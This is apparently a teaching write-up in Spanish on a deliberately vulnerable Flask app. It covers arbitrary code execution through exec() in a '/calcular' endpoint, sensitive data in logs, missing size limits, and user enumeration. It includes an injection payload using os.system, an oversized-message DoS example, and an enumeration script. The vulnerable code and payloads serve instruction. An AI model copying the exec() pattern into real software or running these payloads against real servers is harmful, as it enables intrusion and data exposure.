# Vulnerabilidad en el EndPoint `/calcular` con `exec()`

## Descripción
El código en el endpoint `/calcular` permite a los usuarios enviar un JSON con claves que contienen expresiones matemáticas o código Python para ser ejecutado. Esto se hace a través de la función `exec()` de Python, que ejecuta código arbitrario dentro del contexto del servidor.

### Código vulnerable:

```python
@app.route('/calcular', methods=['POST'])
def calcular():
    if not request.is_json:
        abort(HTTPStatus.BAD_REQUEST)
        
    try:
        calculos_realizar:dict = request.json
        context = {}
        # realiza las cuentas enviadas en el JSON
        for key, value in request.json.items():
            # Vulnerabilidad aquí
            exec(f'{key} = {value}', context)  
        
        # actualiza el contenido del JSON con el resultado de las expresiones
        for key in calculos_realizar:
            calculos_realizar[key] = context[key]

    except Exception as e:
        error_res = f"Excepción de ejecución del mensaje: {e}"
        app.logger.error(error_res)
        return Response(error_res, HTTPStatus.BAD_REQUEST)
    
    res = f"cuentas realizadas:\n{calculos_realizar}"
    app.logger.info(res)
    
    return Response(res, HTTPStatus.OK)
```
## Ejemplo de ejecución maliciosa.

Usando el conocimiento de como funciona la vulnerabilidad, podemos usar `;` para
Seguir enviando instrucciones para ejecutar nuestro código arbitrario.
```json
    {
        "calculo1": "10 + 30",
        "directorios_en_home": "10;import os; directorios_en_home=os.listdir('/home')",
        "intento_de_ls": "__import__('os').system('ls')"
    }
```
### Impacto
Maxima o critica, no existe una vulnerabilidad más grave para un sistema que la ejecución arbitraría de código.
Un atacante con conocimiento podría levantar puertos, borrar archivos, leer información, crear usuarios, cambiar configuraciones, ect.
En este caso, si bien usamos una simple muestra de impresión de contenido de directorios se debe tener en cuenta que esta vulnerabilidad da control total al atacante del servidor.
Jamas, nunca, bajo NINGUN CONCEPTO, se debe permitir la ejecución de código a personal no autorizado con o sin conocimiento técnico dentro del servidor.

# Vulnerabilidad en el EndPoint `/mensaje` con registro de datos sensibles

## Descripción
El código en el endpoint `/mensaje` registra directamente el contenido del mensaje enviado por el usuario en los logs. Esto puede exponer datos sensibles si se almacenan o envían a través del mensaje.

### Código vulnerable:

```python
@app.route('/mensaje', methods=['POST'])
def mensaje():
    if not request.is_json:
        abort(HTTPStatus.BAD_REQUEST)
    
    mensaje:str = request.json['mensaje']
    
    if mensaje.startswith('/'):
        res = f"Este mensaje no es valido: '{mensaje}'"
        app.logger.info(res)  # Vulnerabilidad aquí
        return Response(res, HTTPStatus.BAD_REQUEST)
    
    res = f"Mensaje recibido '{mensaje}'"
    app.logger.info(res)  # Vulnerabilidad aquí
    return Response('Recibido!', HTTPStatus.OK)
```

### Ejemplo de ejecución maliciosa.
Si un usuario envía un mensaje con datos sensibles como contraseñas, estos se registrarán directamente en los logs, exponiendo esa información a cualquier persona con acceso a los logs del servidor:

```json
    {
        "mensaje": "clave_vulnerable"
    }
```
### Impacto
Un usuario sin privilegios puede acceder a información confidencial, esto es sumamente grave para algunos casos criticos,
esta vulnerabilidad se obviara por motivos didacticos para el resto de endpoints, pero NUNCA es buena idea poner en logs contraseñas o 
información sensible. En caso de necesitar algún registro es preferible algo como `se cargaron XX caracteres en un mensaje`.

# Vulnerabilidad en el EndPoint `/mensaje` por falta de validación del tamaño del input


## Descripción
El código en el endpoint /mensaje no verifica el tamaño de la entrada proporcionada por el usuario. Esto permite a un atacante enviar mensajes extremadamente grandes, lo que podría agotar el espacio en disco o los recursos del servidor, resultando en una denegación de servicio (DoS).


```python
@app.route('/mensaje', methods=['POST'])
def mensaje():
    if not request.is_json:
        abort(HTTPStatus.BAD_REQUEST)
    
    mensaje:str = request.json['mensaje']
    
    # No se verifica el tamaño del mensaje
    res = f"Mensaje recibido '{mensaje}'"
    app.logger.info(res)
    return Response('Recibido!', HTTPStatus.OK)
```

### Ejemplo de explotación
Un atacante podría enviar un mensaje muy grande repetidamente para llenar el espacio en disco:

```json
    {
        "mensaje": "ABC" * 10000000  # Mensaje de 10MB
    }
```
### Impacto
Podría saturar la red produciendo un ataque de denegación de servicios como tambien podría dejar inutilizable al servidor por tiempo indefinido hasta que un administrador borre los mensajes maliciosos.
En caso de tener dispositivos de lectura/escritura lentas, podría ocasionar que otros sistemas dentro del mismo servidor se vean bloqueados para guardar archivos incluso habiendo espacio
disponible.
Se debe considerar maximos de tamaños para cada usuario antes de considerar guardar su información en el servidor.


# Vulnerabilidad en el EndPoint `/usuarios/<usuario>` por Enumeración de Usuarios

## Descripción

El código en el endpoint `/usuarios/<usuario>` permite consultar y crear usuarios. Sin embargo, cuando se solicita un nombre de usuario inexistente, el servidor responde de manera diferente si el usuario existe o no, lo que habilita un ataque de **enumeración de usuarios**. Esto permite a un atacante verificar la existencia de usuarios y recolectar información sobre los mismos, explotando el comportamiento del servidor ante solicitudes HTTP.

### Código vulnerable:

```python
@app.route('/usuarios/<usuario>', methods=['GET', 'POST'])
def pagina_usuario(usuario):
    get_nombre = lambda u: u.get('nombre', '')
    match request.method:
        case 'GET':
            # Vulnerabilidad de ataque de enumeración
            if usuario in map(get_nombre, usuarios):
                app.logger.info(f"Se accedio a la pagina del usuario: {usuario}")
                return Response(f"<h1>Hola, {usuario}</h1>")
            return Response("<h1>usuario no encontrado</h1>", HTTPStatus.NOT_FOUND)
        case 'POST':
            import string
            if usuario in map(get_nombre, usuarios):
                return Response("<h1>usuario invalido</h1>", HTTPStatus.CONFLICT)
            valid_chars = string.ascii_letters + string.digits
            # Vulnerabilidad de generación insegura con seed
            d = {
                "nombre": usuario,
                "contraseña": generador.choices(valid_chars, k=15) 
            }
            app.logger.info(f"Se creo un nuevo usuario: {usuario}")
            usuarios.append(d)
            return Response('usuario creado', HTTPStatus.CREATED)
```
### Ejemplo de explotación: `buscador_usuarios.py`
Mediante la ejecución repetida de solicitudes GET al endpoint con nombres de usuario predecibles, se puede realizar un ataque de enumeración. Este script Python simula cómo un atacante podría explotar esta vulnerabilidad para descubrir nombres de usuarios existentes.

#### Ejemplo simplificado
```python
import requests
from http import HTTPStatus

SERVER_URL="http://localhost:5000"

def mapear_usuarios():
    usuarios_mapeados = []
    for i in range(1, 1001):
        usuario = f'usuario_{i}'
        res = requests.get(f'{SERVER_URL}/usuarios/{usuario}')
        match res.status_code:
            case HTTPStatus.OK:
                usuarios_mapeados.append(usuario)
                print(f"\tUsuario encontrado: '{usuario}'")
            case HTTPStatus.NOT_FOUND:
                continue
    print("Usuarios mapeados:")   
    for i, usuario in enumerate(usuarios_mapeados):
        print(f"\t{i+1}. {usuario}")

# Ejecutar la función para mapear usuarios
mapear_usuarios()
```

### Impacto
Este tipo de vulnerabilidad permite a un atacante descubrir usuarios válidos en el sistema, lo cual es un punto de partida para ataques más avanzados, como fuerza bruta o spear phishing. La respuesta del servidor debería ser uniforme tanto para usuarios existentes como no existentes para evitar esta fuga de información.
Es de grave consideración que la obtención de este tipo de información NO es ilegal para la mayoria de casos, es decir, se considera que este tipo de información es "publica" puesto que
cualquier usuario/internauta puede acceder a ella desde cualquier lugar sin necesidad de autenticación o validación adicional por lo que los atacantes tienen un agujero legal para obtener 
información de la organización.